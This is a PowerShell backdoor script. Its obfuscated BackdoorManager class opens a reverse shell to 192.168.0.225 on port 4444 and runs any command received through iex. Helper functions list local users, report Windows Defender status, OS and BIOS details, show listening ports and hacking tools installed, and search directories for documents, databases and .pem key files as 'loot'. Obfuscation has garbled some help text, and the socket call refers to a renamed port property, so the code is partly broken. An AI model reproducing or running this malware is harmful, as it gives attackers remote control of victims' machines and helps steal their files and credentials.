function get_tools() {
    $tools = @("nmap -h", "nc -h", "wireshark -v", "python3 -V", 
    "python -V", "perl -V", "ruby -h", "hashcat -h", "john -h", 
    "airmon-ng -h", "wifite -h", "sqlmap -h", "ssh", "gdb -h", 
    "radare2 -h", "dig -h", "whois -h", "gcc")
    if ($help -eq "--help") {
        return "Checks to see what tools are installed on the system"
    }
    $lines = ""
    foreach ($tool in $tools) {
        try {
            iex $tool | Out-Null
            $tool = $tool.Split(" ")[0]
            $lines += "[+] $tool is installed`n"
        } catch {

        }
    }
    return $lines

}

function get_loot($directory, $help) {
    if ($help -eq "--help") {
        return "Searches a directory for intresting files `nsyntax: get_loot --directory C:\"
    }
    $lines = ''
    $fileNames = Get-ChildItem $directory -Recurse -Include *.doc,*.pdf,*.json,*.pem,*.xlsx, *.xls, *.csv, *.txt *.db, *.exe
    foreach ($f in $fileNames) {
        $filename = $f.FullName
        $lines += "$filename `n"
    }
    return $lines
}

function get_users($help) {
    if ($help -eq "--help") {
        return "Lists all local users on the sTFcEqoSaJRhBD"
    }

    return Get-LocalUser | Select * | Out-String
}

function get_public_ip($help) {
    if ($help -eq "--help") {
        return "Makes a network request to api.ipify.org to fetch the sTFcEqoSaJRhBDs public IP address"
    }
    return (Invoke-WebRequest -uri "https://api.ipify.org/").Content | Out-String
}

function get_bios($help) {
    if ($help -eq "--help") {
        return "Gets the BIOS's manufacturer name, bios name, and firmware type"
    }
    return  Get-ComputerInfo | select BiosManufacturer, BiosName, BiosFirmwareType  | Out-String
}

function get_active($help) {
     if ($help -eq "--help") {
        return "Lists active TCP connections"
    }   
    return Get-NetTCPConnection -State Listen  | Out-String
}

function get_os($help) {
     if ($help -eq "--help") {
        return "Gets infomation about the current OS build"
    }  
    return  Get-ComputerInfo | Select OsManufacturer, OsArchitecture, OsName, OSType, OsHardwareAbstractionLayer, WindowsProductName, WindowsBuildLabEx | Out-String
}


function get_antivirus($help) {
     if ($help -eq "--help") {
        return "Gets infomation about Windows Defender"
    } 
    return  Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String

}

function get_file($remote, $local, $help) {
     if ($help -eq "--help" -or $local -eq $null -or $remote -eq $null) {
        return "Downloads a remote file and saves it to your sTFcEqoSaJRhBD `nsyntax: get_file <remote_path> <local_path>`nPlease use absolute paths!"
    }
    try {
        $content = Get-Content -Path $remote
    } catch {
        $e = $_.Exception
        $msg = $e.Message
        $pAXGAqhcjjQQgm = "`n$msg`n" 
        return $pAXGAqhcjjQQgm 
    }
    return $content
}

function print_help() {
    return "
    get_antivirus - Gets infomation about Windows Defender
    get_os        - Gets infomation about the current OS build
    get_active    - Lists active TCP connections
    get_bios      - Gets the BIOS's manufacturer name, bios name, and firmware type
    get_public_ip - Makes a network request to api.ipify.org to and returns the sTFcEqoSaJRhBDs public IP address
    get_loot      - Searches a directory for intresting files --help (syntax)
    get_tools     - Checks to see what tools are installed on the system
    get_file      - Downloads a remote file and saves it to your sTFcEqoSaJRhBD --help (syntax)
    "
}

class BackdoorManager {
    
    # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
    [string]$OcRkJVPhoRliEmITiEhwQgGY = "192.168.0.225"
    # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
    [int]$CphZmOjClFuyMGSWwh = 4444

    $DqTAQCOTPdZD 
    $iuONtdSGaNEzpU
    $fYGXyBFkgYiSSwkTaihM
    $IxsfJjAAJyaXGpanbczvg
    $nKflNwp
    $ioqmcSuTRybzVZxL

    VhMePagsh() {
        $this.iuONtdSGaNEzpU = New-Object Net.Sockets.TcpClient($this.OcRkJVPhoRliEmITiEhwQgGY, $this.port);
        $this.DqTAQCOTPdZD = $this.iuONtdSGaNEzpU.GetStream();
        $this.IxsfJjAAJyaXGpanbczvg = New-Object Byte[] 1024;
        $this.ioqmcSuTRybzVZxL = New-Object Text.UTF8Encoding;
        $this.fYGXyBFkgYiSSwkTaihM = New-Object IO.StreamWriter($this.DqTAQCOTPdZD, [Text.Encoding]::UTF8, 1024);
        $this.nKflNwp = New-Object System.IO.StreamReader($this.DqTAQCOTPdZD)
        $this.fYGXyBFkgYiSSwkTaihM.AutoFlush = $true;
        $this.XqRZGIJWM()

    }

    xGDVfpzYbvmh($content) {
        [byte[]]$bytes  = [text.Encoding]::Ascii.GetBytes($content)
        $this.fYGXyBFkgYiSSwkTaihM.Write($bytes,0,$bytes.length)     
    }

    XqRZGIJWM() {
        $this.xGDVfpzYbvmh("
     /| 
    / |ejm
   /__|______
  |  __  __  |
  | |  ||  | | 
  | |__||__| |== sh!
  |  __  __()|/      ...I'm not really here.
  | |  ||  | |       
  | |  ||  | |       [*] Use print_help to show all commands
  | |__||__| |       [*] Today's Date: $(date)
  |__________|`n`n")
        while ($this.iuONtdSGaNEzpU.Connected) {
             while ($this.iuONtdSGaNEzpU.DataAvailable) {
                $khmTPpcihutXtlJhycRHZs = [Environment]::UserName
                $sTFcEqoSaJRhBDName = [System.Net.Dns]::GetHostName()
                $qvXUjrJAIMVZlEFej = Get-Location
                $IwadBBRzC = "$khmTPpcihutXtlJhycRHZs@$sTFcEqoSaJRhBDName [$qvXUjrJAIMVZlEFej]~$ "
                $this.xGDVfpzYbvmh($IwadBBRzC)         
                $cVpAUXnR = $this.DqTAQCOTPdZD.Read($this.IxsfJjAAJyaXGpanbczvg, 0, 1024)    
                $cFnGAcmUWutDwcJECXFA = ($this.ioqmcSuTRybzVZxL.GetString($this.IxsfJjAAJyaXGpanbczvg, 0, $cVpAUXnR))
                $pAXGAqhcjjQQgm = "`n"
                if ([string]::IsNullOrEmpty($cFnGAcmUWutDwcJECXFA)) {
                    continue
                }
                try { 
                    $pAXGAqhcjjQQgm = iex $cFnGAcmUWutDwcJECXFA | Out-String
                    $this.xGDVfpzYbvmh($pAXGAqhcjjQQgm + "`n")
                    }
                 catch {
                    $e = $_.Exception
                    $msg = $e.Message
                    $pAXGAqhcjjQQgm = "`n$msg`n"  
                    $this.xGDVfpzYbvmh($pAXGAqhcjjQQgm + "`n")
                }
             }
        }     
        # Clear the DqTAQCOTPdZD
        $this.DqTAQCOTPdZD.Flush()
        # Close the TCP socket
        $this.iuONtdSGaNEzpU.Close()
    }
}

$backdoor = [BackdoorManager]::new()
$backdoor.VhMePagsh()
